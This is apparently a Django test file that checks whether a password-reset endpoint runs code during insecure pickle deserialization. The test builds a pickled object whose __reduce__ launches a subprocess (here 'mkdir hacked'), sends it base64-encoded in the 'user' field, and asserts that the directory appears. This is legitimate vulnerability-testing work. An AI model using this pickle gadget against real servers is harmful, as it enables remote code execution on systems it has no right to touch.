from django.test import TestCase, RequestFactory, Client
from django.shortcuts import reverse
import pickle
import base64
import subprocess
import os

class GenProcess(object):
    def __reduce__(self):
        return (subprocess.Popen, (['mkdir', 'hacked'],))


class TestRemoteCodeExecution(TestCase):
    # setup for all test cases
    def setUp(self):
        self.factory = RequestFactory()
        self.client = Client()
        self.route_name = 'app:password_resets'

    def test_directory_is_made(self):
        encoded = base64.b64encode(pickle.dumps(GenProcess()))
        data = {'password': '123456',
                'password_confirmation': '123456',
                'user': encoded}
        try:
            self.client.post(reverse('app:password_resets'), data=data)
        except:
            pass
        self.assertTrue(os.path.isdir("hacked"))
        os.rmdir('hacked')
